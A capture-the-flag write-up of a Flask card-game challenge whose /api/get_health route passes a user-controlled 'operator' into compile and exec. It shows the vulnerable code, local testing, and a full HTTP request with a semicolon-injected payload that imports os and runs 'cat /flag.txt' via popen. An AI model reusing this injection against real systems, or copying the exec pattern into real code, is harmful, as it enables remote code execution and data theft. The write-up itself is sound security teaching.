# Web Evaluation Check

{% file src="../../../.gitbook/assets/web_evaluation_deck.zip" %}
Challenge source code
{% endfile %}

## Application at-a-glance

Application is a card game that allows user to flip 8 cards.

<figure><img src="../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption><p>Default view</p></figcaption></figure>

When HP bar is depleted game is ended.

<figure><img src="../../../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption><p>End screen</p></figcaption></figure>

## Source Code Review

Most interesting file is `routes.py` as this file store all logic used by application.

{% code lineNumbers="true" %}
```python
from flask import Blueprint, render_template, request
from application.util import response

web = Blueprint('web', __name__)
api = Blueprint('api', __name__)

@web.route('/')
def index():
    return render_template('index.html')

@api.route('/get_health', methods=['POST'])
def count():
    if not request.is_json:
        return response('Invalid JSON!'), 400

    data = request.get_json()

    current_health = data.get('current_health')
    attack_power = data.get('attack_power')
    operator = data.get('operator')
    
    if not current_health or not attack_power or not operator:
        return response('All fields are required!'), 400

    result = {}
    try:
        code = compile(f'result = {int(current_health)} {operator} {int(attack_power)}', '<string>', 'exec')
        exec(code, result) #exec function allows to execute python code
        return response(result.get('result'))
    except:
        return response('Something Went Wrong!'), 500
```
{% endcode %}

First interesting thing is that this application uses `compile` and `exec` function.

Let's analyze the given source code.

{% code lineNumbers="true" %}
```python
    data = request.get_json()

    current_health = data.get('current_health')
    attack_power = data.get('attack_power')
    operator = data.get('operator')
```
{% endcode %}

This piece of code parse `POST` request body and get `current_health`, `attack_power` and `operator` parameters.



Next step is checking if all three variables are set, this ensures that all three parameters are passed in request.

{% code lineNumbers="true" %}
```python
if not current_health or not attack_power or not operator:
        return response('All fields are required!'), 400
```
{% endcode %}

This part is most interesting because of use `exec` function.

{% code lineNumbers="true" %}
```python
 result = {}
    try:
        code = compile(f'result = {int(current_health)} {operator} {int(attack_power)}', '<string>', 'exec')
        exec(code, result) #exec function allows to execute python code
        return response(result.get('result'))
    except:
        return response('Something Went Wrong!'), 500

```
{% endcode %}

But before `exec` call, user input is directly passed to `compile` function and then to `exec`, `current_health` and `attack_power` are casted to int. `Result` variable is returned to the user in reponse

## Vulnerability

As there is no sanitization of user input there is possible RCE (Remote Code Execution) via `exec` function!

## Testing

As I'm not familliar with `compile()/exec()` function combo I copied relevant part of code to new python script for testing.

{% code lineNumbers="true" %}
```python
current_health = '12'
operator = "+"
attack_power = '100'
result = {}

try:
    code = compile(f'result = {int(current_health)} {operator} {int(attack_power)}', '<string>', 'exec')
    exec(code, result)
    print(result.get('result'))
except:
    print('Something Went Wrong!')

```
{% endcode %}

After executing this script number `112` is printed.

`exec` function is capable of executing python code. User controles all three parameters but only `operator` is passed directly to `compile` rest parameters are converted to `int`

One modyfication for testing script is required, because in this state when something is wrong printing `Something Went Wrong!`

To get full traceback `try/except` block can be removed.

So the first try was to set `operator` variable to something easy like `print(1)` and if everything goes well it should print `1`

{% code lineNumbers="true" %}
```python
current_health = '12'
operator = "print(1)"
attack_power = '100'
result = {}
code = compile(f'result = {int(current_health)} {operator} {int(attack_power)}', '<string>', 'exec')
exec(code, result)
print(result.get('result'))
```
{% endcode %}

Unfortunately after executing, script returns `SyntaxError: Invalid Syntax` and result is equal to `result = 12 print(1) 100` so 12 is `current_health` and 100 is `attack_power`&#x20;

<figure><img src="../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption><p>First try - invalid syntax</p></figcaption></figure>

Python is capable of running inline code when next instruction are separated with semicolon `;`&#x20;

{% code lineNumbers="true" fullWidth="true" %}
```python
current_health = '12'
operator = ";print(1);"
attack_power = '100'
result = {}
code = compile(f'result = {int(current_health)} {operator} {int(attack_power)}', '<string>', 'exec')
exec(code, result)
print(result.get('result'))

```
{% endcode %}

Executing this yeild great success! Script printing additianal `1` in terminal window.

<figure><img src="../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption><p>RCE!</p></figcaption></figure>

## Exploitation

With proper code execution now we can read the flag.

{% code lineNumbers="true" %}
```http
POST /api/get_health HTTP/1.1
Host: 127.0.0.1:1337
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://127.0.0.1:1337/
Content-Type: application/json
Origin: http://127.0.0.1:1337
Content-Length: 114
Connection: close
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

{
	"current_health":"43",
	"attack_power":"33",
	"operator":";result = __import__('os').popen('cat /flag.txt').read();"
} 

```
{% endcode %}

After sending this malicious request to application, server returns flag.

<figure><img src="../../../.gitbook/assets/image (4) (1).png" alt=""><figcaption><p>Flag</p></figcaption></figure>

### Payload explanation

```python
"operator":";result = __import__('os').popen('cat /flag.txt').read();"
```

* semicolons are here for valid python code execution - without `;` signs interpreter throws `invalid syntax` error
* `result =` this overwrites variable that is returned in response to the user
* `__import__` is function called by regular import statement this allows to import modules directly so \
  `__import__('os')` means the same as `import os` but can be done inline and can call functions directly by referencing them as `objects`
* `popen('cat /flag.txt`) this function spawns shell process and executes command `cat /flag.txt`
* `read()` reads output of a process from popen&#x20;
